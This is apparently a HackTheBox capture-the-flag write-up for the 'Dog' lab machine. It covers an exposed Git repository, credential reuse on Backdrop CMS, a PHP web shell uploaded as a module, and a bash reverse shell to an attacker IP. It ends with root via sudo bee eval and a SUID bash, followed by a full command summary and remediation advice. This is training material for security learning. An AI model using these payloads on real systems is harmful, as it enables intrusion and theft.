---
layout: post
title: "Dog - HackTheBox WriteUp"
date: 2025-10-27
categories: [CTF, HackTheBox, WriteUp]
tags: [BackdropCMS, Git, CredentialLeak, RCE, PrivilegeEscalation, BeeSudo, Linux]
difficulty: Easy
platform: HackTheBox
author: Aubin SABY
lang: en
permalink: /en/blog/2025/10/27/dog-htb-writeup/
excerpt: "Easy Linux machine exploiting an exposed Git repository on Backdrop CMS, authenticated RCE and privilege escalation via sudo bee."
---

<div class="bg-gradient-to-r from-green-500/10 to-cyan-500/10 p-10 rounded-xl mb-12 border-l-4 border-green-500 shadow-lg">
    <div class="flex flex-col md:flex-row items-start md:items-center justify-between mb-8 gap-6">
        <div class="flex-1">
            <h2 class="text-4xl md:text-5xl font-bold text-green-500 mb-3">
                <i class="fas fa-cube mr-3"></i>Dog
            </h2>
            <p class="text-gray-700 dark:text-gray-300 text-lg md:text-xl">
                Backdrop CMS Git Exposure + RCE + Sudo Privilege Escalation
            </p>
        </div>
        <div class="flex gap-3">
            <span class="px-5 py-2 bg-green-500 text-white rounded-lg text-sm font-semibold shadow-md">
                <i class="fas fa-circle text-xs mr-1"></i>Easy
            </span>
            <span class="px-5 py-2 bg-blue-500 text-white rounded-lg text-sm font-semibold shadow-md">
                <i class="fab fa-linux mr-1"></i>Linux
            </span>
        </div>
    </div>

    <div class="grid grid-cols-2 md:grid-cols-4 gap-6 mt-6">
        <div class="flex items-center gap-3">
            <div class="text-green-500 text-xl">
                <i class="fas fa-calendar"></i>
            </div>
            <div>
                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">Date</div>
                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">2025-10-27</div>
            </div>
        </div>

        <div class="flex items-center gap-3">
            <div class="text-blue-500 text-xl">
                <i class="fas fa-network-wired"></i>
            </div>
            <div>
                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">IP</div>
                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">10.10.11.58</div>
            </div>
        </div>

        <div class="flex items-center gap-3">
            <div class="text-purple-500 text-xl">
                <i class="fas fa-shield-alt"></i>
            </div>
            <div>
                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">OS</div>
                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">Ubuntu 20.04</div>
            </div>
        </div>

        <div class="flex items-center gap-3">
            <div class="text-amber-500 text-xl">
                <i class="fas fa-star"></i>
            </div>
            <div>
                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">Points</div>
                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">20</div>
            </div>
        </div>
    </div>
</div>

## 🎯 Synopsis

**Dog** is an <span class="text-highlight-green">**easy Linux machine**</span> highlighting the compromise of a website running <span class="text-highlight-blue">**Backdrop CMS**</span>, with accidental exposure of a <span class="text-highlight-red">**Git repository**</span> containing sensitive information.

The exploitation follows a logical progression: discovery and extraction of a <span class="text-highlight-orange">**publicly accessible .git repository**</span>, reading sensitive information (settings.php) revealing database credentials, administrator login to Backdrop thanks to <span class="text-highlight-purple">**reused credentials**</span>, then <span class="text-highlight-red">**remote code execution (RCE)**</span> via upload of a malicious PHP module. Lateral movement to the johncusack system user is achieved through password reuse, and <span class="text-highlight-green">**privilege escalation**</span> exploits the bee executable allowed in sudo, enabling arbitrary PHP code execution as root.

<div class="grid md:grid-cols-2 gap-6 my-4">
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-portfolio-violet">
        <h3 class="text-2xl font-bold text-portfolio-violet mb-4">
            <i class="fas fa-brain mr-2"></i>Required Skills
        </h3>
        <ul class="space-y-2 text-gray-700 dark:text-gray-300">
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Web enumeration and CMS reconnaissance</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Source code and Git repository analysis</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Basic knowledge of Linux structure</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Understanding of sudo binary</li>
        </ul>
    </div>
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-cyan-500">
        <h3 class="text-2xl font-bold text-cyan-500 mb-4">
            <i class="fas fa-rocket mr-2"></i>Skills Learned
        </h3>
        <ul class="space-y-2 text-gray-700 dark:text-gray-300">
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Exploitation of exposed Git repository</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>CMS compromise via RCE</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Sudo configuration abuse via PHP interpreter</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Using git-dumper for exfiltration</li>
        </ul>
    </div>
</div>


## 🔍 Phase 1 — Initial Enumeration

### Complete port scan

In-depth scan to identify exposed services:

```bash
nmap -Pn -p- --min-rate=1000 -T4 10.10.11.58
ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.11.58 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -Pn -p$ports -sC -sV 10.10.11.58
```

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
    <h4 class="text-xl font-bold mb-4 text-portfolio-violet flex items-center">
        <i class="fas fa-search mr-2"></i>Scan results
    </h4>
    <div class="space-y-3">
        <div class="flex items-start gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
            <div class="text-3xl text-green-500">
                <i class="fas fa-terminal"></i>
            </div>
            <div class="flex-1">
                <div class="font-bold text-lg text-green-600 dark:text-green-400">Port 22/TCP - SSH</div>
                <div class="text-gray-600 dark:text-gray-400 text-sm mt-1">OpenSSH 8.2p1 Ubuntu</div>
                <div class="text-xs text-gray-500 dark:text-gray-500 mt-2">Authenticated access only</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
            <div class="text-3xl text-blue-500">
                <i class="fas fa-globe"></i>
            </div>
            <div class="flex-1">
                <div class="font-bold text-lg text-blue-600 dark:text-blue-400">Port 80/TCP - HTTP</div>
                <div class="text-gray-600 dark:text-gray-400 text-sm mt-1">Apache httpd 2.4.41 - Backdrop CMS 1.27.1</div>
                <div class="text-xs text-gray-500 dark:text-gray-500 mt-2">Accessible .git/ directory present</div>
            </div>
        </div>
    </div>
</div>

Hosts configuration:

```bash
echo "10.10.11.58 dog.htb" | sudo tee -a /etc/hosts
```

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-lightbulb mr-2 text-cyan-500"></i>
        <strong>Observation:</strong> The presence of a .git directory indicates a potential leak of source code or internal secrets.
    </p>
</div>


## 🧩 Phase 2 — Git Repository Exfiltration

### Using git-dumper

Installation and use of the **git-dumper** tool to reconstruct the complete repository:

```bash
python3 -m venv env
source env/bin/activate
pip install git-dumper
git-dumper http://dog.htb/ dump
```

Once downloaded, restore files:

```bash
cd dump
git restore .
```

### Analysis of settings.php file

Critical file found: `settings.php`

```php
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold">
        <i class="fas fa-key mr-2 text-green-500"></i>
        MySQL credentials retrieved: <code>root : BackDropJ2024DS2024</code>
    </p>
</div>

<div class="bg-amber-100 dark:bg-amber-900/20 border-l-4 border-amber-500 p-4 my-4 rounded-r-lg">
    <p class="text-amber-800 dark:text-amber-200">
        <i class="fas fa-info-circle mr-2 text-amber-500"></i>
        <strong>Note:</strong> The MySQL service is not exposed, but these credentials can be reused elsewhere (CMS accounts, SSH, etc.).
    </p>
</div>


## 🔎 Phase 3 — Backdrop User Enumeration

The CMS login page (/user/login) is protected against brute-force (timeout). However, BackdropCMS manages URL *aliases* — an alternative fuzzing approach is possible:

```bash
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
-u "http://dog.htb/?q=accounts/FUZZ" -mc 403
```

Results:

```
john
tiffany
```

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-lightbulb mr-2 text-cyan-500"></i>
        <strong>Reasoning:</strong> Backdrop returns a 403 code for existing users (confirming their presence).
    </p>
</div>


## 🔓 Phase 4 — Backdrop CMS Compromise

Login test on `/user/login` with the password extracted from `settings.php`:

- **User:** tiffany
- **Password:** BackDropJ2024DS2024

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        Success — Administrator access confirmed \\!
    </p>
</div>


## 💣 Phase 5 — Authenticated Exploitation (RCE)

### a) Version discovery

```bash
curl http://dog.htb/core/profiles/testing/testing.info
```

Returns:

```
project = backdrop
version = 1.27.1
```

<div class="bg-red-50 dark:bg-red-900/20 p-6 rounded-xl border-l-4 border-red-500 my-4">
    <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-3 flex items-center">
        <i class="fas fa-bug mr-2"></i>Vulnerable version
    </h4>
    <p class="text-gray-700 dark:text-gray-300">
        Backdrop CMS 1.27.1 is vulnerable to <strong>Authenticated RCE</strong> (Exploit-DB 51949)
    </p>
</div>

### b) Creating the malicious module

File `shell.php`:

```php
<?php system($_GET['cmd']); ?>
```

File `shell.info`:

```ini
name = Shell
description = Evil module
type = module
core = 1.x
```

Creating the archive:

```bash
tar -czvf shell.tar.gz shell
```

### c) Upload and activation

The installation endpoint is found via alias:

```
http://dog.htb/?q=/admin/modules/install
```

Upload `shell.tar.gz` → success ✅

Execution:

```
http://dog.htb/modules/shell/shell.php?cmd=id
```


## 🐚 Phase 6 — Reverse Shell

Creating a reverse connection:

```bash
bash -c "bash -i >& /dev/tcp/10.10.14.8/1337 0>&1"
```

On the attacker machine:

```bash
nc -lvnp 1337
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold">
        <i class="fas fa-terminal mr-2 text-green-500"></i>
        Connection received: <code>uid=33(www-data) gid=33(www-data)</code>
    </p>
</div>


## 🔁 Phase 7 — Lateral Movement (johncusack)

Inspection of `/etc/passwd`:

```bash
cat /etc/passwd | grep '/home'
```

User presence:

```
johncusack:x:1001:1001::/home/johncusack:/bin/bash
```

SSH test with retrieved credentials:

```bash
sshpass -p 'BackDropJ2024DS2024' ssh johncusack@dog.htb
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        SSH connection successful \\! Password reuse confirmed.
    </p>
</div>

User flag:

```bash
cat /home/johncusack/user.txt
```


## 👑 Phase 8 — Privilege Escalation (sudo bee)

### a) Privilege verification

```bash
sudo -l
```

Output:

```
User johncusack may run the following commands on dog:
(ALL : ALL) /usr/local/bin/bee
```

<div class="bg-amber-100 dark:bg-amber-900/20 border-l-4 border-amber-500 p-4 my-4 rounded-r-lg">
    <p class="text-amber-800 dark:text-amber-200">
        <i class="fas fa-exclamation-triangle mr-2 text-amber-500"></i>
        <strong>Critical discovery:</strong> The CLI tool <code>bee</code> can be executed as root without restriction.
    </p>
</div>

### b) Understanding the bee tool

`bee` is a BackdropCMS CLI tool — it allows execution of PHP commands via the `eval` argument.

### c) Exploitation

Arbitrary code execution:

```bash
sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('whoami && id');"
```

Output:

```
root
uid=0(root) gid=0(root)
```

For a persistent shell:

```bash
sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('cp /bin/bash /tmp/bash && chmod u+s /tmp/bash');"
```

Then:

```bash
/tmp/bash -p
whoami
# root
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-xl">
        <i class="fas fa-crown mr-2 text-amber-500"></i>
        root@dog obtained \\!
    </p>
</div>

Root flag:

```bash
cat /root/root.txt
```

<div class="bg-gradient-to-r from-amber-500/10 to-yellow-500/10 p-6 rounded-xl border-l-4 border-amber-500 my-4">
    <div class="flex items-center gap-4">
        <div class="text-5xl text-amber-500">
            <i class="fas fa-trophy"></i>
        </div>
        <div class="flex-1">
            <h4 class="text-2xl font-bold text-amber-600 dark:text-amber-400 mb-2">Machine Pwned\\!</h4>
            <p class="text-gray-700 dark:text-gray-300">
                <i class="fas fa-flag text-green-500 mr-2"></i><strong>User flag:</strong> /home/johncusack/user.txt<br>
                <i class="fas fa-flag text-red-500 mr-2"></i><strong>Root flag:</strong> /root/root.txt
            </p>
        </div>
    </div>
</div>


## 📋 Phase 9 — Recommendations and Remediations

<div class="grid md:grid-cols-2 gap-6 my-4">
    <div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg border-l-4 border-red-500">
        <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-4 flex items-start">
            <i class="fas fa-ban mr-2 mt-1"></i><span>Configuration errors</span>
        </h4>
        <ul class="space-y-3 text-gray-700 dark:text-gray-300">
            <li class="flex items-start gap-2">
                <i class="fas fa-times text-red-500 mt-1"></i>
                <span>Publicly accessible .git repository</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-times text-red-500 mt-1"></i>
                <span>Credentials stored in cleartext in code</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-times text-red-500 mt-1"></i>
                <span>Password reuse across services</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-times text-red-500 mt-1"></i>
                <span>Overly permissive sudo permissions</span>
            </li>
        </ul>
    </div>
    <div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg border-l-4 border-green-500">
        <h4 class="text-xl font-bold text-green-600 dark:text-green-400 mb-4 flex items-start">
            <i class="fas fa-shield-alt mr-2 mt-1"></i><span>Best practices</span>
        </h4>
        <ul class="space-y-3 text-gray-700 dark:text-gray-300">
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Block access to .git files via server configuration</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Use environment variables for secrets</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Apply principle of least privilege (sudo)</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Keep CMS and plugins up to date</span>
            </li>
        </ul>
    </div>
</div>

---

## 📝 Commands Summary

### 🔍 Phase 1: Network Reconnaissance

```bash
# 1. Fast scan of all ports
nmap -Pn -p- --min-rate=1000 -T4 10.10.11.58

# 2. Detailed scan of open ports
ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.11.58 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -Pn -p$ports -sC -sV 10.10.11.58
# → Ports 22 (SSH) and 80 (HTTP) open
```

### 🧩 Phase 2: Git Repository Extraction

```bash
# 1. git-dumper installation
python3 -m venv env
source env/bin/activate
pip install git-dumper

# 2. Repository extraction
git-dumper http://dog.htb/ dump

# 3. File restoration
cd dump
git restore .

# 4. settings.php analysis
cat settings.php
# → MySQL credentials: root:BackDropJ2024DS2024
```

### 🔎 Phase 3: User Enumeration

```bash
# User fuzzing via Backdrop aliases
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
-u "http://dog.htb/?q=accounts/FUZZ" -mc 403
# → Users found: john, tiffany
```

### 🔓 Phase 4: Backdrop CMS Connection

```bash
# Password reuse test
# URL: http://dog.htb/user/login
# User: tiffany
# Password: BackDropJ2024DS2024
# → Administrator access obtained!
```

### 💣 Phase 5: RCE Exploitation

```bash
# 1. Malicious module creation
mkdir shell
echo '<?php system($_GET["cmd"]); ?>' > shell/shell.php
cat > shell/shell.info << 'EOF'
name = Shell
description = Evil module
type = module
core = 1.x
EOF

# 2. Archive creation
tar -czvf shell.tar.gz shell

# 3. Upload via http://dog.htb/?q=/admin/modules/install
# 4. Activation and test
curl "http://dog.htb/modules/shell/shell.php?cmd=id"
```

### 🐚 Phase 6: Reverse Shell

```bash
# On attacker machine
nc -lvnp 1337

# RCE command
bash -c "bash -i >& /dev/tcp/10.10.14.8/1337 0>&1"
# → www-data shell obtained
```

### 🔁 Phase 7: Lateral Movement

```bash
# User enumeration
cat /etc/passwd | grep '/home'
# → johncusack present

# SSH connection with password reuse
sshpass -p 'BackDropJ2024DS2024' ssh johncusack@dog.htb
# → SSH johncusack obtained!

# User flag retrieval
cat /home/johncusack/user.txt
```

### 👑 Phase 8: Privilege Escalation

```bash
# 1. Sudo verification
sudo -l
# → /usr/local/bin/bee allowed

# 2. Exploitation via bee (Backdrop CLI)
sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('whoami && id');"
# → root uid=0

# 3. SUID shell creation
sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('cp /bin/bash /tmp/bash && chmod u+s /tmp/bash');"

# 4. Root shell execution
/tmp/bash -p
whoami
# → root!

# 5. Root flag retrieval
cat /root/root.txt
```

---

## 🔗 Attack Chain Summary

<div class="bg-white dark:bg-dark-navbar px-6 py-5 rounded-xl shadow-lg my-8">
    <h3 class="text-2xl font-bold text-portfolio-violet mb-4 flex items-center">
        <i class="fas fa-project-diagram mr-2"></i>Complete attack path
    </h3>
    <div class="space-y-4">
        <div class="flex items-start gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
            <div class="text-3xl font-bold text-blue-500 mt-1">1</div>
            <div class="flex-1">
                <div class="font-bold text-blue-600 dark:text-blue-400">Reconnaissance and Git Dump</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">Nmap → .git exposed → git-dumper → settings.php</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
            <div class="text-3xl font-bold text-green-500 mt-1">2</div>
            <div class="flex-1">
                <div class="font-bold text-green-600 dark:text-green-400">Backdrop CMS Compromise</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">User enumeration → tiffany login → RCE via malicious module</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-purple-50 dark:bg-purple-900/20 rounded-lg border-l-4 border-purple-500">
            <div class="text-3xl font-bold text-purple-500 mt-1">3</div>
            <div class="flex-1">
                <div class="font-bold text-purple-600 dark:text-purple-400">Lateral movement</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">www-data → SSH johncusack (password reuse)</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-red-50 dark:bg-red-900/20 rounded-lg border-l-4 border-red-500">
            <div class="text-3xl font-bold text-red-500 mt-1">4</div>
            <div class="flex-1">
                <div class="font-bold text-red-600 dark:text-red-400">Privilege escalation</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">sudo bee → PHP eval → Root shell</div>
            </div>
        </div>
    </div>
</div>

---

## 🏷️ Tags & References

<div class="flex flex-wrap gap-2 my-4" style="line-height: 1.5;">
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(34, 197, 94, 0.1); color: #22c55e; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">Linux</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(59, 130, 246, 0.1); color: #3b82f6; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">BackdropCMS</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(239, 68, 68, 0.1); color: #ef4444; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">Git</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(168, 85, 247, 0.1); color: #a855f7; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">CredentialLeak</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(245, 158, 11, 0.1); color: #f59e0b; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">RCE</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(99, 102, 241, 0.1); color: #6366f1; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">PrivilegeEscalation</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(236, 72, 153, 0.1); color: #ec4899; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">Sudo</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(14, 165, 233, 0.1); color: #0ea5e9; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">BeeSudo</span>
</div>

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
    <h4 class="text-lg font-bold mb-4 text-portfolio-violet flex items-center">
        <i class="fas fa-link mr-2"></i>Useful references
    </h4>
    <ul class="space-y-2 text-gray-700 dark:text-gray-300">
        <li>
            <a href="https://www.exploit-db.com/exploits/51949" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                Exploit-DB 51949 - Backdrop CMS RCE
            </a>
        </li>
        <li>
            <a href="https://github.com/arthaud/git-dumper" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                git-dumper - Tool for dumping Git repositories
            </a>
        </li>
        <li>
            <a href="https://backdropcms.org/" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                Backdrop CMS Official Documentation
            </a>
        </li>
    </ul>
</div>

---

<div class="text-center my-12">
    <a href="{{ site.baseurl }}/en/blog/" class="inline-block bg-gradient-to-r from-portfolio-violet to-cyan-500 hover:from-portfolio-violet-light hover:to-cyan-600 text-white font-bold py-4 px-10 rounded-lg shadow-lg transition duration-300 transform hover:scale-105">
        <i class="fas fa-arrow-left mr-2"></i>Back to blog
    </a>
</div>
